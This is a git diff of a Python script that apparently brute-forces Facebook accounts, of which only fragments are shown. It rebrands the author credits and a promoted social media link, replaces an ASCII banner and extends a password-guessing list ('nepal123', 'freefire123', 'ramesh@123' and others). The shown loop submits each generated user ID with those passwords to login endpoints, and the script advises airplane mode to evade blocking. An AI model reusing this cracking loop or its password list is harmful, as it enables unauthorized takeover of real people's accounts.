@@ -1,9 +1,9 @@
-#created by xerx aka HON3Y-KING
+#created by xerx aka thr-tech
 #open source by HON3Y-KING
-#github= HON3Y-KING
+#github= Thr-tech
 # JAI MAHAKAL
 #JAI BHARAT
-# fb id https://https://https://www.facebook.com/akshda.s.patil.5
+# fb id https://www.facebook.com/Jeneshofficia13
 
 
 from bs4 import BeautifulSoup as sop
@@ -1158,22 +1158,22 @@ def uaku2():
 		ua=open('.ua2.txt','r').read().splitlines()
 		
 os.system("clear")
-print("FOLLOW US ON GITHUB")
-os.system("xdg-open https://github.com/HONEYK1NG")
+print("FOLLOW US ON FACEBOOK")
+os.system("xdg-openhttps://www.facebook.com/Jeneshofficia13")
 #app  check 
 
 
 logo ="""
 
-\x1b[1;97m __   __  ___   _  _______  __    _    __   __  _______  __    _ 
-\x1b[1;91m|  | |  ||   | | ||   _   ||  |  | |  |  |_|  ||   _   ||  |  | |
-\x1b[1;92m|  |_|  ||   |_| ||  |_|  ||   |_| |  |       ||  |_|  ||   |_| |
-\x1b[1;93m|       ||      _||       ||       |  |       ||       ||       |
-\x1b[1;94m|       ||     |_ |       ||  _    |   |     | |       ||  _    |
-\x1b[1;95m|   _   ||    _  ||   _   || | |   |  |   _   ||   _   || | |   |
-\x1b[1;96m|__| |__||___| |_||__| |__||_|  |__|  |__| |__||__| |__||_|  |__|
-
-                         
+\x1b[1;97m   ______   __        _______   __    __   ______    \x1b[1;92m______         __   
+\x1b[1;93m /      \ |  \      |       \ |  \  |  \ /      \  /      \      _/  \  
+\x1b[1;94m|  $$$$$$\| $$      | $$$$$$$\| $$  | $$|  \x1b[1;95m$$$$$$\|  $$$$$$\    |   $$  
+\x1b[1;96m| $$__| $$| $$      | $$__/ $$| $$__| $$| $$__| $$ \x1b[1;97m\$$__| $$     \$$$$  
+\x1b[1;98m| $$    $$| $$      | $$    $$| $$    $$| $$    $$ /      $$      \x1b[1;99m| $$  
+\x1b[1;30m| $$$$$$$$| $$      | $$$$$$$ | $$$$$$$$| \x1b[1;31m$$$$$$$$|  $$$$$$       | $$  
+\x1b[1;32m| $$  | $$| $$_____ | $$      | $$  | $$| $$  | $$| \x1b[1;33m$$_____  __  _| $$_ 
+\x1b[1;35m| $$  | $$| $$     \| $$      | $$  | $$| $$  | $$| $$     \|  \x1b[1;35m\|   $$ \
+\x1b[1;37m \$$   \$$ \$$$$$$$$ \$$       \$$   \$$ \$$   \$$ \x1b[1;91m\$$$$$$$$ \$$ \$$$$$$
                          
 
 \x1b[1;90m[+]==============================================
@@ -1289,7 +1289,7 @@ def xerx1():
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
-			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
+			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123', 'fuck you','ramesh@123','rasmi123']
 			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
 			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
 			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
